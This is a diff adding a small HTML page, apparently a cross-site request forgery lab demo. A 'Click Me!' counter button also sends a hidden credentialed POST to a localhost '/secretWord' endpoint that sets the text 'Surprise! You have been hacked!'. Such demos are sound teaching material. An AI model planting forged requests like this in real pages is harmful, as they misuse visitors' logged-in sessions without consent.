@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Click Me!</title>
+</head>
+<body>
+
+    <button id="runscript">Click Me!</button>
+   <p id="message">You've clicked the button 0 times.</p>
+   <script>
+    document.addEventListener("DOMContentLoaded", () =>{
+        console.log("loaded DOM")
+        const button = document.getElementById("runscript");
+        const message = document.getElementById("message");
+        let i = 0
+        button.addEventListener("click", async () => {
+            console.log("doing fetch")
+            fetch("http://localhost:3000/secretWord",{
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: "secretWord=Surprise! You have been hacked!",
+                mode: 'no-cors',
+                credentials: 'include'
+            }).then((response) => {console.log(response)})
+            .catch((err) => console.log(err))
+            i++;
+            message.textContent = `You've clicked the button ${i} times.`
+        });
+    });
+   </script>
+</body>
+</html>
